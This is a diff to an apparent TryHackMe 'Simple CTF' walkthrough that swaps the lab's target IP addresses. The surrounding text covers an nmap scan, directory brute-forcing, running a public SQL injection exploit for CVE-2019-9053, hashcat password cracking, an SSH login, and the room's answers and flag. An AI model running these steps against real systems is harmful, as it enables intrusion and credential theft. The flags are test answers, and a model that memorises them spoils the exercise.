@@ -12,7 +12,7 @@ Deploy the machine and attempt the questions!
 ```
 2
 ```
-* ```nmap -sC -Cv 10.10.25.90```
+* ```nmap -sC -Cv 10.48.171.222```
 ### What is running on the higher port?
 ```
 ssh
@@ -22,8 +22,8 @@ ssh
 ````
 CVE-2019-9053
 ````
-* ```diresearch -u 10.10.10.10 ```
-As a result, we will find a page ```http://10.10.10.10/simple/``` when we go to it, in the lower left corner,
+* ```diresearch -u 10.48.171.222 ```
+As a result, we will find a page ```http://10.48.171.222/simple/``` when we go to it, in the lower left corner,
 we see what CMS this page was created, it turned out to be "CMS Made Simple 2.2.8" google - CMS Made Simple 2.2.8. [Exploit](https://github.com/Esther7171/THM-Walkthroughs/blob/main/Room/Simple-CTF/exploit.py)
 The very first page https://www.exploit-db.com/exploits/46635 shows that this The CMS is vulnerable to SQL injection and a python exploit has been prepared for this vulnerability (you can find a copy of the file https://github.com/BEPb/tryhackme/blob/master/01.easy/Simple%20CTF/exploit.py) command to download the file to
 
@@ -36,7 +36,7 @@ sqli
 secret
 ```
 * ```pip install termcolor```
-* ```python exploit.py -u http://10.10.25.90/simple```
+* ```python exploit.py -u http://10.48.171.222/simple```
 * ```hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt```
 <p align="center">
   <img width="940" height="452" alt="image" src="https://github.com/user-attachments/assets/aaf19fa4-91ed-4bf3-894a-5acb78182eb4" />
@@ -47,7 +47,7 @@ secret
 ```
 ssh
 ```
-* ```ssh mitch@10.10.10.10 -p 2222```
+* ```ssh mitch@10.48.171.222 -p 2222```
 ### What's the user flag?
 ```
 G00d j0b, keep up!
